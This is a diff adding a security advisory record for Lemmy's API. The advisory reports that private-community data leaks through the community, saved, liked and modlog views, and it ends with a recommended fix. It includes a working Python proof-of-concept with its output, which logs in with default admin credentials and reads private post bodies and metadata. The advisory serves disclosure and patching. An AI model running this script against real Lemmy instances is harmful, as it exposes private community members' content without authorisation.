@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-95q8-x6r6-672m",
+  "modified": "2026-05-06T22:41:43.077655Z",
+  "published": "2026-05-06T22:22:41Z",
+  "summary": "Lemmy may expose private community data through community, saved, liked, and modlog API views",
+  "details": "## Summary\n\nLemmy applies private-community checks in `PostView` and `CommentView`, but several adjacent API views skip the accepted-follower filter. Bob, a registered user who is not an accepted follower, can read private community `sidebar` and `summary` fields. Alice, a former accepted follower, can still read saved and liked private post bodies after she leaves. An unauthenticated visitor can read private community metadata and removed private post names through the modlog.\n\n## Details\n\n`CommunityView::read()` and `CommunityQuery::list()` call `visible_communities_only()`, but they do not add the private-community filter used by post and comment reads:\n\n```rust\nquery = my_local_user.visible_communities_only(query);\nquery.first(conn).await.with_lemmy_type(LemmyErrorType::NotFound)\n```\n\n`PersonSavedCombinedQuery::list()` and `PersonLikedCombinedQuery::list()` join `community_actions`, but they only filter by the requesting person id. They do not require `community_actions.follow_state = Accepted` when the community has `visibility = Private`.\n\nThe modlog query returns `ListingType::All` without a visibility predicate:\n\n```rust\nquery = match self.listing_type.unwrap_or(ListingType::All) {\n  ListingType::All =\u003e query,\n```\n\nThe control paths show the expected check. `PostView::read()` and `CommentView::read()` both filter private communities to accepted followers:\n\n```rust\ncommunity::visibility\n  .ne(CommunityVisibility::Private)\n  .or(community_actions::follow_state.eq(CommunityFollowerState::Accepted))\n```\n\n## Proof of Concept\n\nThe following script reproduces the leak against a fresh Lemmy instance. Tested against `dessalines/lemmy:nightly` with the default setup account from the sample config. The script opens registration so it can create Alice and Bob.\n\n```python\nimport requests, random, string\n\nBASE = \"http://127.0.0.1:8536/api/v4\"  # change to the target Lemmy URL\nADMIN_USER = \"lemmy\"\nADMIN_PASS = \"lemmylemmy\"\nPASSWORD = \"Password123456!\"\n\ndef req(method, path, token=None, params=None, **body):\n    headers = {}\n    if token:\n        headers[\"Authorization\"] = \"Bearer \" + token\n    return requests.request(method, BASE + path, headers=headers, params=params, json=body or None)\n\ndef register(name):\n    r = req(\"POST\", \"/account/auth/register\", username=name, password=PASSWORD,\n            password_verify=PASSWORD, email=name + \"@example.test\")\n    r.raise_for_status()\n    token = r.json()[\"jwt\"]\n    person_id = req(\"GET\", \"/account\", token).json()[\"local_user_view\"][\"person\"][\"id\"]\n    return token, person_id\n\ndef show(label, response, marker):\n    text = response.text\n    print(\"\\n\" + label + \": HTTP\", response.status_code)\n    print(text[:700])\n    print(\"contains marker:\", marker in text)\n\nsuffix = \"poc\" + \"\".join(random.choice(string.ascii_lowercase) for _ in range(6))\nadmin = req(\"POST\", \"/account/auth/login\", username_or_email=ADMIN_USER, password=ADMIN_PASS).json()[\"jwt\"]\nreq(\"PUT\", \"/site\", admin, registration_mode=\"open\", email_verification_required=False)\n\nalice, alice_id = register(\"alice\" + suffix)\nbob, _ = register(\"bob\" + suffix)\nsecret = \"SECRET_\" + suffix\n\ncommunity = req(\"POST\", \"/community\", admin,\n                name=\"priv\" + suffix,\n                title=\"Private Proof \" + suffix,\n                sidebar=secret + \" sidebar\",\n                summary=secret + \" summary\",\n                visibility=\"private\").json()[\"community_view\"][\"community\"]\ncommunity_id = community[\"id\"]\npost = req(\"POST\", \"/post\", admin, name=\"secret post \" + suffix,\n           community_id=community_id, body=secret + \" post body\").json()[\"post_view\"][\"post\"]\npost_id = post[\"id\"]\n\nshow(\"Bob reads private community metadata\", req(\"GET\", \"/community\", bob, params={\"id\": community_id}), secret)\nshow(\"Bob direct post read control\", req(\"GET\", \"/post\", bob, params={\"id\": post_id}), secret)\n\nreq(\"POST\", \"/community/follow\", alice, community_id=community_id, follow=True)\nreq(\"POST\", \"/community/pending_follows/approve\", admin,\n    community_id=community_id, follower_id=alice_id, approve=True)\nreq(\"PUT\", \"/post/save\", alice, post_id=post_id, save=True)\nreq(\"POST\", \"/post/like\", alice, post_id=post_id, is_upvote=True)\nreq(\"POST\", \"/community/follow\", alice, community_id=community_id, follow=False)\n\nshow(\"Alice direct post read after leaving\", req(\"GET\", \"/post\", alice, params={\"id\": post_id}), secret)\nshow(\"Alice saved list after leaving\", req(\"GET\", \"/account/saved\", alice), secret)\nshow(\"Alice liked list after leaving\", req(\"GET\", \"/account/liked\", alice), secret)\n\nmod_comm = req(\"POST\", \"/community\", admin,\n               name=\"modlog\" + suffix,\n               title=\"Private Modlog \" + suffix,\n               sidebar=secret + \" modlog sidebar\",\n               summary=secret + \" modlog summary\",\n               visibility=\"private\").json()[\"community_view\"][\"community\"]\nmod_post = req(\"POST\", \"/post\", admin, name=secret + \" removed post\",\n               community_id=mod_comm[\"id\"], body=\"body\").json()[\"post_view\"][\"post\"]\nreq(\"POST\", \"/post/remove\", admin, post_id=mod_post[\"id\"], removed=True, reason=\"poc\")\nshow(\"Unauthenticated modlog\", req(\"GET\", \"/modlog\", params={\"listing_type\": \"all\", \"limit\": 50}), secret)\n\n```\n\nOutput:\n\n```text\nBob reads private community metadata: HTTP 200\ncontains marker: True\nBob direct post read control: HTTP 404\ncontains marker: False\nAlice direct post read after leaving: HTTP 404\ncontains marker: False\nAlice saved list after leaving: HTTP 200\ncontains marker: True\nAlice liked list after leaving: HTTP 200\ncontains marker: True\nUnauthenticated modlog: HTTP 200\ncontains marker: True\n```\n\n## Impact\n\nBob can read private community descriptions and sidebars before a moderator approves him. Alice can leave a private community, or a moderator can remove her, and Lemmy still returns private post bodies that Alice saved or liked while she was a member. An unauthenticated visitor can use the public modlog to discover private community metadata and removed private post names.\n\n## Recommended Fix\n\nApply the same private-community filter used by `PostView` and `CommentView` to `CommunityView::read()`, `CommunityQuery::list()`, `PersonSavedCombinedQuery::list()`, `PersonLikedCombinedQuery::list()`, and the `ListingType::All` branch of the modlog query. Admins and accepted followers should keep access. Other callers should receive the same `404` behavior as `GET /post` and `GET /comment`.\n\n---\n*Found by [aisafe.io](https://aisafe.io)*",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "lemmy_api",
+        "purl": "pkg:cargo/lemmy_api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.19.1-rc.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-95q8-x6r6-672m/GHSA-95q8-x6r6-672m.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/LemmyNet/lemmy/security/advisories/GHSA-95q8-x6r6-672m"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/LemmyNet/lemmy/commit/637151121a8e27b2b8c95e98d6f86966b31b4a6d"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/LemmyNet/lemmy"
+    }
+  ]
+}
